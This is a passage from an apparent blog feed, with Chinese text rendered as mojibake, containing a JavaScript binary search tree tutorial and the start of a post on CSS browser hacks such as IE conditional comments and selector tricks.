ä¸€ä¸ªè·å¾—å½“å‰èŠ‚ç‚¹æ•°æ®çš„æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Node.prototype.getData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.data;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘å®šä¹‰"><a href="#äºŒå‰æ ‘å®šä¹‰" class="headerlink" title="äºŒå‰æ ‘å®šä¹‰"></a>äºŒå‰æ ‘å®šä¹‰</h4><p>å®šä¹‰äºŒå‰æ ‘ï¼Œåˆå§‹æ ¹èŠ‚ç‚¹ä¸º nullï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">BST</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="æ’å…¥"><a href="#æ’å…¥" class="headerlink" title="æ’å…¥"></a>æ’å…¥</h4><p>äºŒå‰æ ‘çš„æ’å…¥è§„åˆ™ï¼š</p><ol><li>æ˜¯å¦æœ‰æ ¹èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹2.  æ¯”å½“å‰èŠ‚ç‚¹å€¼å°ï¼Œè½¬ 3ï¼Œå¦åˆ™è½¬ 43.  æ˜¯å¦æœ‰å·¦å¶å­èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹å·¦å¶å­èŠ‚ç‚¹ï¼Œå¦åˆ™è®¾å…¶å·¦å¶å­èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹ï¼Œè½¬ 24.  æ˜¯å¦æœ‰å³å¶å­èŠ‚ç‚¹ï¼Œæ²¡æœ‰åˆ™è®¾æ’å…¥èŠ‚ç‚¹ä¸ºå½“å‰ç»“ç‚¹å³å¶å­èŠ‚ç‚¹ï¼Œå¦åˆ™è®¾å…¶å³å¶å­èŠ‚ç‚¹ä¸ºå½“å‰èŠ‚ç‚¹ï¼Œ è½¬ 2</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">BST.prototype.insert = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> n = <span class="keyword">new</span> Node(data, <span class="literal">null</span>, <span class="literal">null</span>);</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) &#123;</div><div class="line">        <span class="keyword">this</span>.root = n;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">        <span class="keyword">let</span> parent;</div><div class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">            parent = current;</div><div class="line">            <span class="keyword">if</span> (data &lt; current.getData()) &#123;</div><div class="line">                current = current.left;</div><div class="line">                <span class="keyword">if</span> (!current) &#123;</div><div class="line">                    parent.left = n;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                current = current.right;</div><div class="line">                <span class="keyword">if</span> (!current) &#123;</div><div class="line">                    parent.right = n;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="è·å–æœ€å°å€¼"><a href="#è·å–æœ€å°å€¼" class="headerlink" title="è·å–æœ€å°å€¼"></a>è·å–æœ€å°å€¼</h4><p>åœ¨äºŒå‰æ ‘ä¸­ï¼Œç”±äºè¾ƒå°å€¼éƒ½æ˜¯åœ¨å·¦èŠ‚ç‚¹ï¼Œæ‰€ä»¥éå†å®Œå·¦èŠ‚ç‚¹å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BST.prototype.getMin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current.left) &#123;</div><div class="line">        current = current.left;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> current.getData();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="è·å–æœ€å¤§å€¼"><a href="#è·å–æœ€å¤§å€¼" class="headerlink" title="è·å–æœ€å¤§å€¼"></a>è·å–æœ€å¤§å€¼</h4><p>åœ¨äºŒå‰æ ‘ä¸­ï¼Œç”±äºè¾ƒå¤§å€¼éƒ½æ˜¯åœ¨å³èŠ‚ç‚¹ï¼Œæ‰€ä»¥éå†å®Œå³èŠ‚ç‚¹å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BST.prototype.getMax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current.right) &#123;</div><div class="line">        current = current.right;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> current.getData();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="è·å–èŠ‚ç‚¹æ•°é‡"><a href="#è·å–èŠ‚ç‚¹æ•°é‡" class="headerlink" title="è·å–èŠ‚ç‚¹æ•°é‡"></a>è·å–èŠ‚ç‚¹æ•°é‡</h4><p>æ€»èŠ‚ç‚¹ = å·¦èŠ‚ç‚¹ + å³èŠ‚ç‚¹ + 1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BST.prototype.countNode = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.countNode(node.left) + <span class="keyword">this</span>.countNode(node.right) + <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="ä¸­åºéå†"><a href="#ä¸­åºéå†" class="headerlink" title="ä¸­åºéå†"></a>ä¸­åºéå†</h4><p>è§„åˆ™æ˜¯å…ˆéå†å·¦èŠ‚ç‚¹ï¼Œç„¶ååˆ°æ ¹èŠ‚ç‚¹ï¼Œæœ€ååˆ°å³èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Sorted_binary_tree_inorder.svg/440px-Sorted_binary_tree_inorder.svg.png" alt="inOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.inOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        inOrder(node.left);</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">        inOrder(node.right);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="å…ˆåºéå†"><a href="#å…ˆåºéå†" class="headerlink" title="å…ˆåºéå†"></a>å…ˆåºéå†</h4><p>è§„åˆ™æ˜¯ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œå…ˆå·¦èŠ‚ç‚¹ï¼Œå†å³èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Sorted_binary_tree_preorder.svg/440px-Sorted_binary_tree_preorder.svg.png" alt="preOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.preOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">        preOrder(node.left);</div><div class="line">        preOrder(node.right);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="ååºéå†"><a href="#ååºéå†" class="headerlink" title="ååºéå†"></a>ååºéå†</h4><p>è§„åˆ™æ˜¯ä»å·¦èŠ‚ç‚¹å¼€å§‹ï¼Œå†å³èŠ‚ç‚¹ï¼Œæœ€ååˆ°æ ¹èŠ‚ç‚¹ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Sorted_binary_tree_postorder.svg/440px-Sorted_binary_tree_postorder.svg.png?1445511399697" alt="postOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.postOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        postOrder(node.left);</div><div class="line">        postOrder(node.right);</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢-Breadth-First-Search"><a href="#åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢-Breadth-First-Search" class="headerlink" title="åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢(Breadth First Search)"></a>åˆ†å±‚éå†å¹¿åº¦æŸ¥è¯¢(Breadth First Search)</h4><p>åˆ†å±‚éå†ç›¸å¯¹å¤æ‚ï¼Œå®ƒæ˜¯ä¸€å±‚ä¸€å±‚è¿›è¡Œéå†çš„ï¼Œå›¾ç¤º(æ¥è‡ª <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)ï¼š</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Sorted_binary_tree_breadth-first_traversal.svg/320px-Sorted_binary_tree_breadth-first_traversal.svg.png" alt="level tranverse"></p><p>å…·ä½“æ€è·¯æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åæŠŠå„å±‚èŠ‚ç‚¹åœ¨æ¯æ¬¡å¾ªç¯å‹å…¥è¿™ä¸ªæ•°ç»„ï¼Œæ¯æ¬¡å¾ªç¯éƒ½å°†è¿™ä¸€å±‚èŠ‚ç‚¹çš„å€¼æ‰“å°å‡ºæ¥ï¼ŒåŒæ—¶è®¾ç½®å¾ªç¯ç»“æŸæ¡ä»¶ä¸ºå½“å‰ç»“ç‚¹ä¸ºæœ€åèŠ‚ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">BST.prototype.levelTraverse = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">let</span> q = [node],</div><div class="line">        current = <span class="number">0</span>,</div><div class="line">        last = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (current &lt; q.length) &#123;</div><div class="line">        last = q.length;</div><div class="line">        <span class="keyword">let</span> A = [];</div><div class="line">        <span class="keyword">while</span> (current &lt; last) &#123;</div><div class="line">            A.push(q[current].getData());</div><div class="line">            <span class="keyword">if</span> (q[current].left) &#123;</div><div class="line">                q.push(q[current].left);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (q[current].right) &#123;</div><div class="line">                q.push(q[current].right);</div><div class="line">            &#125;</div><div class="line">            current++;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">console</span>.log(A.toString());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h4><p>æŸ¥æ‰¾å…¶å®ç›¸å¯¹ç®€å•ï¼Œæ¯•ç«ŸæŸ¥æ‰¾æ•°å€¼ä¸å½“å‰ç»“ç‚¹ï¼Œå°åˆ™å¾ªç¯åˆ°å·¦èŠ‚ç‚¹ï¼Œå¤§åˆ™å¾ªç¯åˆ°å³èŠ‚ç‚¹ï¼Œç­‰äºåˆ™è¿”å›ï¼ŒæŸ¥æ‰¾ä¸åˆ°è¿”å› nullã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">BST.prototype.find = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">Object</span>.is(data, current.getData())) &#123;</div><div class="line">            <span class="keyword">return</span> current;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; current.getData()) &#123;</div><div class="line">            current = current.left;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            current = current.right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h4><p>è¿™é‡Œæœ‰ä¸ªè§†é¢‘è®²è§£éå¸¸è¯¦ç»†ï¼Œä¸è¿‡è¦è‡ªå¤‡æ¢¯å­ï¼š<a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="external">Delete a node from Binary Search Tree</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/gcULXE7ViZw" frameborder="0" allowfullscreen></iframe><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">BST.prototype.deleteNode = <span class="function"><span class="keyword">function</span>(<span class="params">node, data</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) &#123;</div><div class="line">        <span class="keyword">return</span> node;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; node.data) &#123;</div><div class="line">        node.left = <span class="keyword">this</span>.deleteNode(node.left, data);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &gt; node.data) &#123;</div><div class="line">        node.right = <span class="keyword">this</span>.deleteNode(node.right, data);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> ((!node.left) &amp;&amp; (!node.right)) &#123;</div><div class="line">            node = <span class="literal">null</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.left) &#123;</div><div class="line">            node = node.right;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.right) &#123;</div><div class="line">            node = node.left;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">let</span> temp = node.right.getMin();</div><div class="line">            node.data = temp;</div><div class="line">            node.right = <span class="keyword">this</span>.deleteNode(node.right, temp);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> node;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BST.prototype.delete = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="keyword">this</span>.deleteNode(<span class="keyword">this</span>.root, data);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>å…¨éƒ¨ä»£ç åœ¨ <a href="https://github.com/youngdze/js-algorithms/blob/master/lib/dataStructures/binarySearchTree.js" target="_blank" rel="external">Github</a>ã€‚</p><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul><li><a href="http://blog.csdn.net/luckyxiaoqiang/article/details/7518888" target="_blank" rel="external">http://blog.csdn.net/luckyxiaoqiang/article/details/7518888</a></li><li><a href="https://en.wikipedia.org/wiki/Tree_traversal" target="_blank" rel="external">https://en.wikipedia.org/wiki/Tree_traversal</a></li><li><a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="external">https://youtu.be/gcULXE7ViZw</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;åƒæˆ‘è¿™ç§é‡ç”Ÿç¨‹åºå‘˜è¿å„å¤§å…¬å¸æ ¡æ‹›ç¬”è¯•éƒ½è¿‡ä¸äº†ï¼Œä¸»è¦æ˜¯æ•°æ®ç»“æ„å’Œç®—æ³•è–„å¼±ï¼Œä»Šå¤©å°ç±³å‡ºäº†é“äºŒå‰æ ‘ï¼Œè€ƒäºŒå‰æ ‘çš„åˆ†å±‚éå†ï¼Œæˆ‘å½“ç„¶æ˜¯ä¸ä¼šåšï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;èŠ‚ç‚¹å®šä¹‰&quot;&gt;&lt;a href=&quot;#èŠ‚ç‚¹å®šä¹‰&quot; class=&quot;headerlink&quot; title=&quot;èŠ‚ç‚¹å®šä¹‰&quot;&gt;&lt;/a&gt;èŠ‚ç‚¹å®šä¹‰&lt;/h4&gt;&lt;p&gt;äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Node&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data, left, right&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.data = data;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.left = left;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.right = right;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://youngdze.co/categories/Algorithm/"/>
    
    
      <category term="binary search tree" scheme="http://youngdze.co/tags/binary-search-tree/"/>
    
  </entry>
  
  <entry>
    <title>CSS Hack</title>
    <link href="http://youngdze.co/2015/10/18/css-hack/"/>
    <id>http://youngdze.co/2015/10/18/css-hack/</id>
    <published>2015-10-18T05:21:22.000Z</published>
    <updated>2016-12-05T05:36:07.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬ç¯‡æ–‡ç« å°±æ˜¯ä¸ºäº†æˆ‘å»å‰ç«¯ç¬”è¯•é¢è¯•è€Œå†™çš„ï¼Œå‚è€ƒ <a href="http://www.webdevout.net/css-hacks" target="_blank" rel="external">CSS hacks</a> å’Œ <a href="http://browserhacks.com/" target="_blank" rel="external">Browserhacks</a>ã€‚</p></blockquote> <a id="more"></a><h4 id="IE-æœ‰æ¡ä»¶æ‰§è¡Œ"><a href="#IE-æœ‰æ¡ä»¶æ‰§è¡Œ" class="headerlink" title="IE æœ‰æ¡ä»¶æ‰§è¡Œ"></a>IE æœ‰æ¡ä»¶æ‰§è¡Œ</h4><p><strong>è¯­æ³•</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if condition]&gt; HTML &lt;![endif]--&gt;</span></div><div class="line"><span class="comment">&lt;!--[if !condition]&gt; HTML &lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>å°äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>å°äºæˆ–ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lte IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>å¤§äºæˆ–ç­‰äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if gte IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>å¤§äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if gt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>ä¸å¤§äº</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if !gt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>ä¸æ˜¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if !IE]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><h4 id="CSS-selectors"><a href="#CSS-selectors" class="headerlink" title="CSS selectors"></a>CSS selectors</h4><h5 id="è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„-bug-æ¥å®ç°çš„"><a href="#è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„-bug-æ¥å®ç°çš„" class="headerlink" title="è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„ bug æ¥å®ç°çš„"></a>è¿™äº›å®é™…ä¸Šæ˜¯ç”¨äº†æµè§ˆå™¨çš„ bug æ¥å®ç°çš„</h5><p>IE6 å’Œä»¥ä¸‹ IE ç‰ˆæœ¬</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* <span class="selector-tag">html</span> &#123;&#125;</div></pre></td></tr></table></figure><p>IE7 å’Œä»¥ä¸‹ IE ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬ IE6ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125; * <span class="selector-tag">html</span>&#123;&#125;</div></pre></td></tr></table></figure><p>IE7 only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125;</div></pre></td></tr></table></figure><p>IE7 å’Œç°ä»£æµè§ˆå™¨ only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span>&gt;<span class="selector-tag">body</span> &#123;&#125;</div></pre></td></tr></table></figure><p>åªç”¨äºç°ä»£æµè§ˆå™¨(IE8 and above)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span>&gt;<span class="comment">/**/</span><span class="selector-tag">body</span> &#123;&#125;</div></pre></td></tr></table></figure><p>ç”¨æ³•(ä»¥ IE7 only ä¸ºä¾‹)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> <span class="selector-id">#foo</span> <span class="selector-class">.bar</span> &#123;&#125;</div></pre></td></tr></table></figure><h4 id="important"><a href="#important" class="headerlink" title="!important"></a>!important</h4><p>ç”±äº IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE ä¸æ”¯æŒ <code>!important</code>ï¼Œæ‰€ä»¥å¦‚ä»¥ä¸‹ CSS IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ä¼šä½¿ç”¨åé¢çš„æ ·å¼</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span> &#123;</div><div class="line">    <span class="attribute">background</span>: green <span class="meta">!important</span>;   <span class="comment">/* ä¸»æµæµè§ˆå™¨è¯†åˆ«æ 